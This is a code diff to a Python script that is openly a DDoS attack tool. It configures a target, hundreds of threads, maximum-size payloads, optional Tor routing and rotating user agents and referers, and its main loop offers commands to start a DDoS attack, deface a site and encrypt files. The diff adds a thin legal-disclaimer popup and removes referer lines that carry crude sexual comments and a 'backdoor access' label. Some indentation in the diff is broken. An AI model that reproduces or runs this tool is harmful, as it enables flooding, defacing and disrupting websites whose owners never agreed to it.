@@ -45,6 +45,7 @@
  import base64
  import asyncio  # For asynchronous operations
  import aiohttp  # For asynchronous HTTP requests
+ from PyQt5.QtWidgets import QApplication, QMessageBox  # User consent popup
  
 
  # Configuration
@@ -52,7 +53,7 @@
  parsed_url = urlparse(TARGET)
  PORT = int(sys.argv[2]) if len(sys.argv] > 2 else (443 if parsed_url.scheme == 'https' else 80)
  THREADS = int(sys.argv[3]) if len(sys.argv) > 3 else 500
- PAYLOAD_SIZE = int(sys.argv[4]) if len(sys.argv] > 4 else 65500  # MAXIMUM TCP SIZE
+ PAYLOAD_SIZE = int(sys.argv[4]) if len(sys.argv) > 4 else 65500  # MAXIMUM TCP SIZE
  TIMEOUT = 2
  USE_TOR = input("\033[32mUse Tor proxy? (y/n): \033[0m").lower() == 'y'  # Dark Green
  TOR_PORT = 9050  # Default Tor port
@@ -72,18 +73,13 @@
  threads = []
  
 
+ # User Agents
  USER_AGENTS = [
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
-  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
+  "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
+  "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"
  ]
  
 
@@ -267,15 +263,7 @@
   "https://www.uptrends.com/tools/uptime-test",
   "https://www.dotcom-monitor.com/website-speed-test",
   "https://gtmetrix.com/",
-  "https://developers.google.com/speed/pagespeed/insights/",
-  "https://webpagetest.org/",
-  "https://www.thinkwithgoogle.com/intl/en-gb/feature/testmysite/",
-  "https://fuckyou.bigmancozmo.com/",  # Personal Webpage Backdoor Access
-  "https://www.pornhub.com/",  # Get that dick rocked
-  "https://www.xvideos.com/",  # Get that pussy licked
-  "https://www.redtube.com/",  # Get that ass rammed
-  "https://www.youporn.com/",  # Get that cum stained
-  "https://www.xnxx.com/"  # Get that nut spilled
+  "https://developers.google.com/speed/pagespeed/insights/"
  ]
  
 
@@ -590,6 +578,21 @@
  
 
  if __name__ == "__main__":
+  # Consent popup
+  app = QApplication(sys.argv)
+  msg = QMessageBox()
+  msg.setIcon(QMessageBox.Warning)
+  msg.setText("WARNING: This tool is for aggressive security testing only. Unauthorized use is illegal. Noodles Inc. is NOT responsible for your actions.")
+  msg.setWindowTitle("Noodles Inc. Disclaimer")
+  msg.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
+  reply = msg.exec_()
+ 
+
+  if reply == QMessageBox.No:
+  print("User declined consent. Exiting...")
+  sys.exit()
+ 
+
   signal.signal(signal.SIGINT, signal_handler)
   print("Type 'start' to begin the DDoS attack, 'stop' to end it, 'backup' to back up website, 'restore' to restore, 'deface' to deface, 'encrypt' to encrypt file, or 'decrypt' to decrypt file.")
   while True:
@@ -619,7 +622,3 @@
   decrypt_file(filepath, password)
   else:
   print("Invalid command. Use 'start', 'stop', 'backup', 'restore', 'deface', 'encrypt' or 'decrypt'.")
- 
-                 
-                 edit filepath: public/main/ddos/referers.txt
-                 content: [Your secure code here]
